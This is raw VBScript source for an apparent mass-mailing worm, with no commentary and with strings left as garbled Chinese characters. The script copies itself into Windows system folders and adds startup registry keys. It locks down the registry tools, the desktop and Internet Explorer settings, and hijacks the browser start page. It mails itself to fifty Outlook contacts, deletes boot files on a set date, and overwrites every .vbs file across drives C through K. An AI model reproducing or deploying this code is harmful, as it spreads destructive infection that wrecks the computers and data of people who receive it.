On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
Set fs = CreateObject("Scripting.FileSystemObject")
Set dir1 = fs.GetSpecialFolder(0)
Set dir2 = fs.GetSpecialFolder(1)
Set so = CreateObject("Scripting.FileSystemObject")
Dim r
Set r = CreateObject("Wscript.Shell")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\������ɢ.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir2&"\������ɢ.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Start Menu\Programs\����\������ɢ.vbs")
r.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows ScriptingHost\Settings\Timeout",0,"REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 63000000, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", ""
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode", 1, "REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\������ɢ", "������ɢ.vbs"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskBar", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders", 1, "REG_DWORD"
r.Regwrite "HKLM\Software\CLASSES\.reg\", "txtfile"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption", "���ɲ���"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText", "������ɢ��"
Set ol = CreateObject("Outlook.Application")
On Error Resume Next
For x = 1 To 50
Set Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject = "�������ҵ����գ���������"
Mail.Body = "������ã���������Rose������������������롣����������Ķ����Ÿ�����ף�����ˣ�            ������"
Mail.Attachments.Add(dir2&"������ɢ.vbs")
Mail.Send
Next
ol.Quit
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock", 1, "REG_DWORD"
r.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page", "http://hxci.com.cn/jisu"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions", 1, "REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu", 1, "REG_DWORD"
If Date = #01/01/2003# Then
Of.DeleteFile ("C:\ntdetect.com")
Of.DeleteFile ("C:\command.com")
Of.DeleteFile ("C:\io.sys")
Of.DeleteFile ("C:\ntldr")
End If
Set fso = CreateObject("Scripting.FileSystemObject")
Set File = fso.OpenTextFile(WScript.ScriptFullname,1)
content=File.ReadAll
spread("c:\")
spread("d:\")
spread("e:\")
spread("f:\")
spread("g:\")
spread("h:\")
spread("i:\")
spread("j:\")
spread("k:\")
Sub spread(folder)
on error resume next
Set F = fso.GetFolder(folder)
Set SubF = F.SubFolders
For each f in SubF
infect(f)
spread(f)
Next
End Sub
Sub infect(folder)
on error resume next
Set File = fso.GetFolder(folder)
Set FileClass = File.Files
For each f in FileClass
ext=right(lcase(fso.GetExtensionName(f.path)),3)
s=lcase(f.name)
If (ext="vbs")Then
set ap=fso.OpenTextFile(f.path,2,true)
ap.write content
ap.close
End If
Next
End Sub 